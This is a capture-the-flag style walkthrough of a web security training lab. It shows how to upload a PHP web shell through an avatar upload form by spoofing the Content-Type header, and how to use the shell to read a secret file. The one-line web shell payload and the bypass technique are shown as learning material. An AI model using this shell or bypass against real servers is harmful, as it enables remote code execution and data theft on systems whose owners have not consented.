---
Category: File upload
LAB: https://0a0d00e804a6e45a801262330089005f.web-security-academy.net/
Difficulty: Apprentice
Featured:
---
---

# Information / Description
This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`


---

# Walkthrough


Very similar to the lab from before but now we need to bypass the content-type

Okay so let's start from the beginning, what happens if we try to upload our `php` code from before as an avatar

```
<?php system($_GET['cmd']) ?>
```

![](../../../0.%20Assets/Web%20shell%20upload%20via%20Content-Type%20restriction%20bypass-1784567175607.webp)

We are told that the file type must be an image, very good we can easily bypass that by changing the `content-type` to an image

![](../../../0.%20Assets/Web%20shell%20upload%20via%20Content-Type%20restriction%20bypass-1784567229182.webp)

![](../../../0.%20Assets/Web%20shell%20upload%20via%20Content-Type%20restriction%20bypass-1784567239038.webp)

And now we do the same thing, we call the parameter `cmd` and pass our commands through there


![](../../../0.%20Assets/Web%20shell%20upload%20via%20Content-Type%20restriction%20bypass-1784567337257.webp)


![](../../../0.%20Assets/Remote%20code%20execution%20via%20web%20shell%20upload-1784566930869.webp)

![](../../../0.%20Assets/Web%20shell%20upload%20via%20Content-Type%20restriction%20bypass-1784567532501.webp)

```
ZBQeYjoH4mOVhC0JFJse2YHZvrA18dcS
```

and then submit the solution

![](../../../0.%20Assets/Web%20shell%20upload%20via%20Content-Type%20restriction%20bypass-1784567574379.webp)